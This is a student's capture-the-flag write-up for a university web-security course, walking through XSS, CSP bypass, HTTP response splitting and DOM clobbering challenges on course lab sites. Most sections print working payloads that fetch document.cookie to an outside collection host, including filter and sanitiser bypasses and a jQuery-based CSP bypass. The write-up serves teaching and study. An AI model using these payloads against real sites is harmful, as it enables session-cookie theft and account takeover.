---
title: "Course CTF: Week 7 & 8"
date: 2020-07-15T11:09:45+10:00

categories: ["Course CTF"]
hiddenFromHomePage: false
postMetaInFooter: false

flowchartDiagrams:
  enable: false
  options: ""

sequenceDiagrams: 
  enable: false
  options: ""

---


## User Profile Info

Site: profile.-QBSITE-

SVG payload

```svg
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
 
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
<script>fetch('https://my.collection.site?x=' + document.cookie)</script>
</script>
</svg>
```

Gets uploaded to https://profile.-QBSITE-/profileimage?1594777740

Doesn't execute directly through the profile page loading, however we can tamper the /report button


```
POST /report HTTP/1.1
Host: profile.-QBSITE-
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 29
Origin: https://profile.-QBSITE-
DNT: 1
Connection: close
Referer: https://profile.-QBSITE-/profile
Cookie: flag=NO_FLAG_FOR_YOU
Pragma: no-cache
Cache-Control: no-cache

path=/profileimage?1594777740
```

> `COMP6443{SVG_XSS_SO_MEDIUM.ejUyMDY2Nzc=.vk+m9+KB6s/BSIeedwAhTQ==}`


## Science Today

Site: science-today.-QBSITE-

### Reflected XSS

Perform a search with the payload

```html
<script/>fetch('https://my.collection.site?x=' + document.cookie);</script/>
```

By reflection, a SCRIPT tag will be injected into the page.  
The site performs some basic XSS prevention by stripping out the `onerror` and `onload` keywords, as well as `<script>`, but not `<script/>`!

> `COMP6443{REF_XSS_SO_SIMPLE.ejUyMDY2Nzc=.Xm3aaquwPaMTtFOH8YOEJw==}`

### Stored XSS

Submit a comment with the payload

```html
<img src="a" onerror="fetch('https://my.collection.site?x=' + document.cookie)" />
```

This will inject the IMG tag into the page, which will then execute on every page that contains that comment

> `COMP6443{REF_XSS_SO_SIMPLE_STORED.ejUyMDY2Nzc=.9J7mhiosWeE9Jc6nYy+Yaw==}`

---

## Student Record

Site: sturec.-QBSITE-

The site is protected by the CSP Headers: `script-src 'self'; object-src 'none'; base-uri 'none';`.  
Therefore, inline scripts will not be able to execute - however, scripts/resources that exist on the server (`self`) will run!

These resources include the following:

* `/css/sticky-footer-navbar.css`
* `/create.html`
* `/js/helper.js`
* `/students.jsonp`

The "Last Name" query is vulnerable to XSS provided our script is not inline, and points to one of the above...

### JSONP 

JSONP allows us to send a query, whose results is executed by a callback function we supply.  
If a site does not sanitise the callback function, we can inject our own function!

```html
<script src="/students.jsonp?q=&callback=((results)=>{/* YOUR CODE HERE */})"></script> 
```

The server will then call our code, passing the results of the search into the `results` parameter!

The website seems to sanitise the `.` character - so in order to get the cookies, we can do `document['cookie']` instead of `document.cookie` (yay for everything being a dictionary/object in JS).

We can perform a search with the payload

```html
<script src="/students.jsonp?q=&callback=(()=>{fetch(`${atob('aHR0cHM6Ly9teS5jb2xsZWN0aW9uLnNpdGU/eD0=')}${document['cookie']}`)})();//"></script>
<!-- Code is slightly different to the template payload above... because I did it this way before making this writeup -->
```

This will cause the payload to be reflected in the HTML, which executes a fetch.  
And this works, because as per the CSP scripts from the same origin are considered trusted

> `COMP6443{JSONP_XSS_SO_MEDIUM.ejUyMDY2Nzc=.1sW4xxbSNv168i7nnFnG2w==}`

### Create

When creating a student through the `/user-create` endpoint - all of the fields are escaped.  
This makes our `<script>` tags becomes `&lt;script&gt;` - nooo!  

However, there is a field (that gets added through the `/js/helpers.js` script) which is vulnerable!  
There _is_ some sanitisation going on (regex replacer `/<(?:\w+)\W+?[\w]/g`), but we can circumvent it easily.

```html
<!-- BEFORE -->
<script>blahblahblah</script>

<!-- Inserting '<_<_' between the '<' and 's' -->

<!-- AFTER -->
<<_<_script>blahblahblah</script>
```

We can then form our payload

```html
<<_<_script src="/students.jsonp?q=&callback=(()=>{fetch(`${atob('aHR0cHM6Ly9teS5jb2xsZWN0aW9uLnNpdGU/eD0=')}${document['cookie']}`)})"></script>
```

> `COMP6443{STORED_XSS_SO_MEDIUM.ejUyMDY2Nzc=.TjXo3P2uvQ9IaECuZlRjag==}`

<details>

<summary>Bored? Want to see what I tried? (it didn't work, and was way overcomplicated)</summary>


The `/create.html?` and `/user-create` endpoints have a different CSP header to the rest of the website...

```
Content-Security-Policy: script-src 'self'; script-src-elem 'self' 'unsafe-inline'; script-src-attr 'none';
```

> This attempt worked locally, but didn't send the flag when reporting to admin.  
It involved exploiting the fact that through the JSONP call, we can execute Javascript commands.  
As the `/user-create` endpoint reflects our payload (during the duplicate user case); we could trigger inline Javascript (through the `lname` field) when that duplicate user error appears.  
To get that error to exist, we will need to make the browser perform a POST request, and render the results - This attack vector can be entered through the `dcreat` field not being entirely sanitised.

---

The first thing to think about is the result of what we want.  

When a POST request (containing a duplicate user) to `/user-create` is made; an error containing the reflected contents of `lname` will be rendered (and executed) - allowing us to capture the flag.

This payload will be the contents of the `lname` field in our bigger payload.

```html
<script>fetch(`https://my.collection.site/?x=${document.cookie}`)</script>
```

Next, since the `/user-create` endpoint is a POST method, there are only (roughly) two ways to POST in Javascript.  

* `fetch(..., {method: "POST"})`
* Submitting a HTML form

Since the client would have to then parse and render contents of the result page - only the second method would be viable.

We would first need to inject the following HTML code into the page

```html
<form action="/user-create" method="POST">
  <input name="fname" value="FFFF">
  <input name="lname" value="<script>fetch(`https://my.collection.site/?x=${document.cookie}`)</script>">
  <input name="email" value="EEEE@EEEE">
  <input name="mobile" value="11111111">
  <input name="inputCity" value="CCCC">
  <input name="inputState" value="SSSS">
  <input name="inputZip" value="1111">
  <input name="snormal" value="yes">
  <input name="dcreat" value="DDDD">
</form>
```

We can manually submit this form, so that the email `EEEE@EEEE` will be registered, and cause subsequent submissions of the same data to give us our desired duplicate user exists error.

This form payload becomes the value of the `dcreat` field in yet another `/user-create` POST request.  

**However**, we do have to be mindful that there is a string sanitiser that is run against our payload.  
This sanitiser is a regex string replacer with the following pattern `/<(?:\w+)\W+?[\w]/g`.  

Basically, it screws up your opening element tags, but with some trial and error, we can break this sanitisation by adding some characters between the opening `<` and the first letter of the tag.

```html
<!-- BEFORE -->
<script>blahblahblah</script>

<!-- Inserting '<_<_' between the '<' and 's' -->

<!-- AFTER -->
<<_<_script>blahblahblah</script>
```

Applying this sanitisation bypass, we end up with our new payload

```html
<<_<_form action="/user-create" method="POST">
  <<_<_input name="fname" value="FFFF">
  <<_<_input name="lname" value="<<_<_script>fetch(`https://my.collection.site/?x=${document.cookie}`)</script>">
  <<_<_input name="email" value="EEEE@EEEE">
  <<_<_input name="mobile" value="11111111">
  <<_<_input name="inputCity" value="CCCC">
  <<_<_input name="inputState" value="SSSS">
  <<_<_input name="inputZip" value="1111">
  <<_<_input name="snormal" value="yes">
  <<_<_input name="dcreat" value="DDDD">
</form>
```

We can then place this modified form code into the `dcreat` field in our second `/user-create` POST request.  

_I would recommend to set the `lname` field to something unique (I used `"TOES"`) so that it is easy to identify this payload later._  
_The other fields can be whatever is valid, so this POST request actually gets accepted._

After the payload has been accepted, we can browse to the home page of the website and inspect the source code, to see that our form has been reflected into the webpage.

Finally we can trigger a form submission through our JSONP exploit!  
i.e. `document['querySelectorAll']('form')[1]['submit']()`

Do note that the JSONP functionality only exists within a search.  

> When not performing a search, the server returns the data together with the HTML.  
When performing a search, the client queries and executes a JSONP query.  

Since our JSONP exploit gets executed before the page loads its helper functions, we need to insert the data manually ourselves - such as through `document.write(...)`.

```html
<script src="/students.jsonp?q=TOES&callback=((arr)=>{document['write'](arr[0]['dcreat']);document['querySelectorAll']('form')[1]['submit']()})"></script>
```

This payload writes the content of the `dcreat` key from the first item in the JSON result, and then executes the submit function on the form that should have then been created.

When we enter this payload into the search field, the browser will 

* Query the server for users with a last name containing `"TOES"`
* Run a custom callback
  * Render the contents of `dcreat` in the document (Creates a form!)
  * Submits the form
* Client will parse and render the duplicate user error page
* The script payload inside `lname` will be executed
* ???
* Profit

> Too bad this didn't work - It was way overcomplicated...

</details>

## Report

Site: report.-QBSITE-

`/robots.txt` reveals that there is a directory `/view`.  

When we browse it, we get an error message saying `missing report id`.  
Looks like we will need to pass some sort of ID as a path (`/view/<ID>`)

After we try to post a dummy payload (`name=a&content=a`) to the `/report` endpoint, we get a cookie sent back to us.  
Decoding this, we find a base64 encoded `md5` hash. If we use that as an ID (i.e. `/view/f85b9762-e7db-4223-aefd-e2fc6739e4c9`) we are brought to the contents of our payload. A `flag` cookie is also set, containing a base64 encoded string (`no flag for you`).

This cookie has the HTTP Only option set; so we won't be able to use Javascript methods.

Looking inside the view page, there is a script that sanitises the payload before rendering it as HTML code

```js
let div = document.querySelector('div[id=report]');
let contents = atob('<SOME BASE64 ENCODED STRING THAT CONTAINS YOUR CONTENT PAYLOAD');

// https://www.reddit.com/r/programminghumor/comments/d0kb4e/my_favourite_language/

let blacklisted_tags = [
    'script',
    'object',
];

let blacklisted_attribs = [
    /^on.*/i,
];

let sanitize = (parent, el) => {
    // Let's do our magic here!

    console.info('Analysing', el);

    if (blacklisted_tags.includes(el.tagName.toLowerCase())) {
        console.info('Bad element, deleting', el);

        parent.removeChild(el);

        return;
    }

    for (let i = 0; i < el.attributes.length; i++) {
        let attr = el.attributes[i];

        for (let battr of blacklisted_attribs) {
            if (attr.name.search(battr) > -1) {
                console.info(`Removing ${attr.name} from`, el);
                el.removeAttribute(attr.name);

                continue;
            }

            // Check if the src begins with javascript

            if (attr.name === 'src' && attr.value.toLowerCase().indexOf('javascript:') > -1) {
                console.info('Dangerous src detected, sanitising', attr.value);

                attr.value = '';
            }
        }
    }

    for (let child of el.children) {
        sanitize(el, child);
    }

    return el;
};

try {
    let template = document.createElement('template');

    template.innerHTML = contents;

    for (let root of template.content.children) {
        sanitize(template.content, root);
    }

    div.innerHTML = template.innerHTML;
} catch (e) {
    div.textContent = 'Failed to parse report, XSS protection activated!';
    console.error('jokes they probably fucked up their js', e);
}
```

Glancing through, it goes through each tag element in the payload, and performs some checks.

* Removes any `<script>` tags
* Removes any `<object>` tags
* Removes attributes that start with `on` (i.e. `onerror`, `onload`)
* Do it recursively for any child tags

But!!!!  
There's a flaw in the code

```
let blacklisted_attribs = [
    /^on.*/i,
];

...

for (let battr of blacklisted_attribs) { ... }
```

`blacklisted_attribs` only contains a single item; meaning that the `for` loop will only find and remove the first `on*` attribute.

We can easily circumvent this by adding a dummy attribute before our Javascript exploit, by using the `<img>` tag.

```html
<img src=a on onerror=alert('XSS!')</img>
```

POSTing this payload as the `content`, then viewing the page with the ID from the cookie; our Javascript successfully executes!

Now we can just do a `fetch` with the `document.cookie`! Right?  

Nup.

Since the HTTP Only option is set, we need to somehow get the flag into somewhere accessible...

Having a look at the response headers when viewing `/view/f85b9762-e7db-4223-aefd-e2fc6739e4c9`, there exists an `X-Meta` header which contains the title of our report... Hmm I wonder if it's sanitised...  
On the following line is the Set-Cookie flag header

```
X-Meta: target=a; time=2020-07-21 01:31:16.361953
Set-Cookie: flag=bm8gZmxhZyBmb3IgeW91; Path=/; HttpOnly; Secure

<RESPONSE BODY>
```

> _Hmm I wonder if it's sanitised..._

Surely enough, it's not - this is where HTTP Response splitting comes in!

If we add `\r\n\r\n` to our payload title, it will cause the `Set-Cookie` header line to be part of the response body.

```
X-Meta: target=a

; time=2020-07-21 01:31:16.361953                       <-------- Response body starts here
Set-Cookie: flag=bm8gZmxhZyBmb3IgeW91; Path=/; HttpOnly; Secure

<RESPONSE BODY>
```

Our page now contains the base64 flag, which is now trivial to extract and send off to our request listener.

Payload Title: `a\r\n\r\n`  
Payload Content: `<img on=alert(1) onerror=fetch("https://my.collection.site?x="+/flag=.+?;/.exec(document.body.innerHTML)[0]) src=a>`

_Note: I used some regex to extract the flag string: `/flag=.+?;/.exec(document.body.innerHTML)[0]`_

> `COMP6443{WHY_ARE_YOU_REPORTING_ME.ejUyMDY2Nzc=.NyqLkIfitPDBwXdbfcOEAQ==}`

## CSP

### Challenge 1

Site: csp.-QBSITE-/csp.html

```
# CSP Headers :: Before
default-src 'none';
script-src 'self' ssl.google-analytics.com;
style-src 'self' maxcdn.bootstrapcdn.com fonts.googleapis.com;
font-src fonts.gstatic.com maxcdn.bootstrapcdn.com;
img-src 'self' ssl.google-analytics.com
```

If we have an inline script that does not have a `nonce` tag, we can add its hash into the `script-src` CSP headers: 'sha256-R+A6ELN3JPMHUe0uf6qIRigpfMFEvnoKN/xNPiAbOdc='

> `COMP6443{CSP_CHA_1_LEV1.ejUyMDY2Nzc=.nLZOzE1fzYO/+tdSvBM4lQ==}`

For scripts with a `nonce`, we can add that into the `script-src` CSP headers: 'nonce-2726c7f26c'

> `COMP6443{CSP_CHA_2_PIC.ejUyMDY2Nzc=.6A26lIs4xaKbG4/Cp8vnYQ==}`

For the `unsplash.it` image, it requires three hosts to be allowed: 'unsplash.it picsum.photos i.picsum.photos'

> `COMP6443{CSP_CHA_3_LEV2.ejUyMDY2Nzc=.COC+5iMtKxG9zmKSz4idew==}`

```
# CSP Headers :: After
default-src 'none';
script-src 'self' ssl.google-analytics.com 'sha256-R+A6ELN3JPMHUe0uf6qIRigpfMFEvnoKN/xNPiAbOdc=' 'nonce-2726c7f26c';
style-src 'self' maxcdn.bootstrapcdn.com fonts.googleapis.com;
img-src 'self' ssl.google-analytics.com unsplash.it picsum.photos i.picsum.photos;
font-src fonts.gstatic.com maxcdn.bootstrapcdn.com
```

### Challenge 2

Site: csp.-QBSITE-/csp-quotes.html

Can't use hashes to allow scripts!

The `quote-loader.js` dynamically inserts the `get-quote.js` script into the page; however only if the `strict-dynamic` source directive is added.

> COMP6443{CSP_CHA_4_ALT.ejUyMDY2Nzc=.Eivb5EtOkpRirVUwm+Ap2A==}`


```
CSP Headers :: Before
default-src 'none';
script-src 'nonce-onyDVMyUbCMVPCJc7AaTdA==' 'self' ssl.google-analytics.com;
style-src 'self' maxcdn.bootstrapcdn.com fonts.googleapis.com;
img-src 'self' ssl.google-analytics.com;
font-src fonts.gstatic.com maxcdn.bootstrapcdn.com
```

```
# CSP Headers :: After
default-src 'none';
script-src 'nonce-onyDVMyUbCMVPCJc7AaTdA==' 'self' ssl.google-analytics.com 'strict-dynamic';
style-src 'self' maxcdn.bootstrapcdn.com fonts.googleapis.com;
img-src 'self' ssl.google-analytics.com;
font-src fonts.gstatic.com maxcdn.bootstrapcdn.com
```

## Support V2

_This challenge took me 5 days, in 4 sittings to get. BUT I FINALLY DID IT._

Site: support-v2.-QBSITE-

Unlike `support.-QBSITE-`, this challenge has nothing to do with any base58 or IDOR enumeration.  
Instead we're met with Content Security Policy roadblocks and sandboxed `iframes`.

```
Content-Security-Policy: script-src 'unsafe-eval' 'strict-dynamic' 'nonce-...'; base-uri 'none'; object-src 'none'
```

CSP Level 3 (`strict-dynamic`) is employed here, allowing only verified scripts to be executed.  

* Material Design Lite (1.3.0)
* JQuery (3.5.1)
* DOMPurify (2.0.12)
  
All these libraries are the latest version (time of writing) - and do not have any _reported_ vulnerabilities.

* The ticket body is encoded as b64, and is securely decoded with `atob`.
* The `iframe` on the page has the `sandbox` attribute set without the `allow-scripts` permission. This will prevent any code from running inside the frame
* Resources in an `iframe` inherit the CSP regulations of that frame's source as well as its parents
* The page employs a `DOMPurify` script, that will strip away <s>every possible</s> most XSS payloads
  * We either need to find an undetected pattern in DOMPurify, or bypass the library

The contents inside `/report/[ticketID].js` (_Line 8_) can be tampered with by modifying the `ticketID`. However CSP is strictly set to `nonce` verification, rather than any `self` origin - and there doesn't seem to be any way to tamper with the headers

```js
// jquery is too hard. i copied this random piece of code from stackoverflow
// it seems to be working. i don't know why, but at least it works
// why was javascript invented
setTimeout(function(){
  sandbox = document.getElementById("tk").contentWindow;
  div = document.createElement("div");
  div.setAttribute("id", "rp");
  div.innerHTML = "Found an issue? <a href=\"/report/[TICKETID]\">Report this page to admin</a>";
  sandbox.document.body.appendChild(div);
  $(sandbox.document.body).prepend(sandbox.rp);
}, 1000);
```

So let's summarise our issues

* CSP - strict-dynamic, nonce-based, iframe inheritance
* Libraries - Up to date, secure (ish)
* Ticket Body - Stored and decoded securely
* DOMPurify - Sanitisation of XSS
* iframe - Sandbox w/o script execution

The first attack vector we can find is the **ticket title**.  
The contents of the title are reflected verbosely into the response HTML, giving us partial control of the DOM.  
It does however have a maximum length of 35 characters; not a lot, but enough!

The title is located before the import of DOMPurify library and the sanitisation routine.  
By injecting a `<script>` tag as the title, we render the HTML `script` tag which loads DOMPurify, as part of the Javascript code. This causes a CSP error, but more importantly - we've manipulated the DOM and prevented DOMPurify from loading!  

The inline code block then decrypts the base64 ticket body and attempts to sanitise it.  
However as we've removed DOMPurify from the page, the sanitisation fails and the script continues (thanks to the `try catch` block). This will cause the `srcdoc` of the iframe to contain an unsanitised ticket body!  

But hang on... Our iframe code been nulled from our `<script>` injection, and it had sandboxing policies!  
Well, since we've nulled it, we add a new iframe into our DOM, _without_ the sandbox!  
We can control references to `#tk` to point to our new 'freed' `iframe`!

Our header payload ends up as both the iframe and script opening tag.  
It's 31 characters long, and so will fit the 35 character limit!

```html
<iframe id=tk></iframe><script>
```

With the header payload injected, we can see that the site looks exactly the same - except now our ticket body payload is executable and XSS-able!

The next issue to face is bypassing CSP protection. Hm.  

To execute a script, the script must contain the `nonce` value that is dynamically generated with each page visit.  
With the ticket title payload, we could possibly keep the opening script tag unclosed, such that the `nonce` value inside the DOMPurify script tag would be added as an attribute - _however_ due to the structure of the elements this wasn't possible.  

An `iframe` inherits the CSP policies of the parent document, meaning a resource (i.e script) must conform to the iframe's CSP policy, the iframe's parent's CSP policy, the iframe's parent's parent's CSP policy and so forth...  
So executing a script in the `iframe` would not be possible, without already having access to Javascript to insert the nonce.

The other way would be DOM Clobbering.  

Some HTML elements allow us to override DOM properties.  
<s>Horrible right?</s> Cool right!?

* `<a>` tags resolve to their `href` value
  * i.e. `<a id=id href=abc>` will cause `id + 'def' = 'abcdef'`
* Tags with the same id will return a HTML Collection when accessed by their id 
  * i.e. `<a id=a><a id=a name=b href=data>`
  * `a` -> [a, a]
  * `a.b` -> data
* `<form>` tags allow us to build a multilevel dictionary
* `<iframe srcdoc=...>` tags allow us to access HTML structures
* `<img>` tags allow us to override `document.cookie` and `document.body`

**Read More**

* https://portswigger.net/web-security/dom-based/dom-clobbering
* https://portswigger.net/research/dom-clobbering-strikes-back
* [Even more](https://lmgtfy.com/?q=DOM+Clobbering)

Cool, so we can perform DOM Clobbering. But on what?  
Our requirements of DOM Clobbering is to not cause any Javascript syntax or runtime errors, so we won't be able to clobber the majority of the Javascript code.

...

This is where we go hackerman mode, and start auditing source code of libraries.  

![](https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/d8328f77-2bec-4a20-9483-ea76dd62985e/dan31sc-80f18518-0ef0-4bdc-9c0a-11c9e62b769f.png/v1/fill/w_1192,h_670,q_70,strp/hackerman_by_shiiftyshift_dan31sc-pre.jpg?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOiIsImlzcyI6InVybjphcHA6Iiwib2JqIjpbW3siaGVpZ2h0IjoiPD0xMDgwIiwicGF0aCI6IlwvZlwvZDgzMjhmNzctMmJlYy00YTIwLTk0ODMtZWE3NmRkNjI5ODVlXC9kYW4zMXNjLTgwZjE4NTE4LTBlZjAtNGJkYy05YzBhLTExYzllNjJiNzY5Zi5wbmciLCJ3aWR0aCI6Ijw9MTkyMCJ9XV0sImF1ZCI6WyJ1cm46c2VydmljZTppbWFnZS5vcGVyYXRpb25zIl19.iBlOitqc4h2_YWFaG3IUb-UQ1MGU-V_M0azcwUwGUSI)

Remember when I said that the libraries used in the site were up to date and secure?  
Yeah well, they're _relatively_ secure.  

There's a JQuery vulnerability test site [here](http://research.insecurelabs.org/jquery/test/) which reports JQuery 3.5.1 as safe against previously reported vulnerabilities. But ironically, JQuery is the library we are going to audit, because of the `unsafe-eval` directive in the CSP headers.

`unsafe-eval` allows Javascript to be executed through `eval`.  
JQuery requires this in order to perform it's DOM manipulation functions - when a `<script>` tag is added to the DOM via JQuery, the `nonce` values are appended automatically!

The only JQuery code occurence that may have a attack vector possibility is inside the helper script.  
`$(sandbox.document.body).prepend(sandbox.rp);`

Hm, the `.prepend()` function... Let's take a look at that

> Now's a good idea to open your Developer Tools, get another 3 monitors and fire up Burp Suite.

Knowing that our end goal is to get Javascript execution from a `<script>` tag inside our ticket body, we can create our test payload

Title Payload - `<iframe id=tk></iframe><script>`  
Body Payload - `<script>alert('pwned!')</script>`

We can then take a look at the JQuery script through the debugger in our Developer Tools.  

> I recommend setting up Burp to change .min.js references to their verbose .js files

The overall structure of the prepend function (concerning our exploit) is

* `prepend()` function is called
* `domManip()` function is called
* `buildFragment()` function is called
* Checks are done, and scripts are possibly executed

By setting breakpoints around crucial code segments, we find the following requirements

* A `<script>` tag must exist
* `domManip:first` must be truthy (`fragment.firstChild`)
* `!dataPriv.access(node, "globalEval")` must evaluate to `true`
  * `dataPriv.access(node, "globalEval")` must evaluate to `false`
* `buildFragment:attached` must evaluate to `false` (`isAttached(elem)`)

Upon inspecting the state of the function, we find that `attached` evalutes to `true`, which prevents the script from being executed.

The `isAttached` function checks if `elem` is inside `elem.ownerDocument`.  

```
# Expected DOM state for propery isAttached functionality

<root / elem.ownerDocument>
  <elem>
```

So ***finally***, to break this check we can perform DOM Clobbering and create a separate element that can be identified as `ownerDocument`.

```
# Desired DOM state for forced isAttached functionality

<root>
  <elem>
    <ownerDocument>
```

As `elem.ownerDocument` is a child of `elem`, it will _not_ contain `elem`!

We can form our payload as such

```html
<form id=rp>
  <input name=ownerDocument>
  <script>alert('pwned!')</script>
```

And tada! We've gotten Javascript execution!

From here it's a simple task of sending off the `document.cookie` value to our endpoint.

---

**Ticket Title Payload**

```
<iframe id=tk></iframe><script>
```

**Ticket Body Payload**

```html
<form id=rp>
  <input name=ownerDocument>
  <script>fetch('https://my.collection.site?x=' + document.cookie)</script>
```

> `COMP6443{WOW_I_AM_IMPRESSED.ejUyMDY2Nzc=.1nt3n6lCZgj2Oln7THyzhg==}`


**et cetera**

* I set up my Burp Suite to change minified scripts to their verbose version - making debugging via the developer tools MUCH easier.
* CSP can be set via a `<meta>` tag
  * [Reading material](https://content-security-policy.com/examples/meta)
  * This tag must appear in the `<head>` of a page
* The DOM is confusing
